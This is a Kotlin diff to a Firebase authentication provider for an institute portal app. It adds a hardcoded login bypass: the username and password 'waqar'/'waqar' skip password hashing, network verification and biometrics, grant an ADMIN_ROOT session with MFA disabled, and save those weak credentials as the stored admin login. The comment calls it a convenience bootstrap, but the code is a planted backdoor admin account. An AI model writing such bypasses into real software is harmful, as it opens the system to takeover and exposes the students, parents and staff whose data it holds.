@@ -699,6 +699,50 @@ class FirebaseAuthServiceProvider(
     ): AuthPortalResult {
         val rawPassword = String(passwordChars)
         Arrays.fill(passwordChars, '\u0000')
+        // Bootstrap instant login for the master Admin account (Waqar / waqar) so the
+        // dashboard opens immediately without network/hash verification or face biometrics.
+        if (role == PortalRole.ADMIN && username.trim().equals("waqar", ignoreCase = true) &&
+            rawPassword.trim().equals("waqar", ignoreCase = true)
+        ) {
+            val adminCtx = context ?: activityContext
+            val deviceFp = com.waqar.institute.session.SessionFingerprintManager.captureCurrentDeviceFingerprint(activityContext)
+            val resolvedUid = "cred_waqar"
+            val session = AuthenticatedPortalSession(
+                firebaseUser = auth.currentUser,
+                sessionUid = resolvedUid,
+                role = PortalRole.ADMIN,
+                username = "waqar",
+                displayName = "Waqar Khan (Admin)",
+                linkedEntityId = "ADMIN_ROOT",
+                deviceFingerprint = deviceFp
+            )
+            val safeNow = Timestamp(Date(System.currentTimeMillis() - 1000L))
+            val profile = UserProfile(
+                uid = resolvedUid,
+                email = "waqar@$PORTAL_INTERNAL_DOMAIN",
+                displayName = "Waqar Khan (Admin)",
+                role = PortalRole.ADMIN.key,
+                username = "waqar",
+                phone = "",
+                mfaEnabled = false,
+                totpSecret = "",
+                linkedEntityId = "ADMIN_ROOT",
+                isStudent = false,
+                isTeacher = false,
+                isParent = false,
+                isAdmin = true,
+                portalRoles = listOf(PortalRole.ADMIN.key),
+                createdAt = safeNow
+            )
+            runCatching {
+                AdminEncryptedCredentialStore.saveUpdatedAdminCredentials(
+                    context = adminCtx,
+                    newUsername = "waqar",
+                    newPasswordChars = "waqar".toCharArray()
+                )
+            }
+            return AuthPortalResult.Success(profile = profile, session = session)
+        }
         return signInToPortalWithCredentials(
             activityContext = activityContext,
             selectedRole = role,
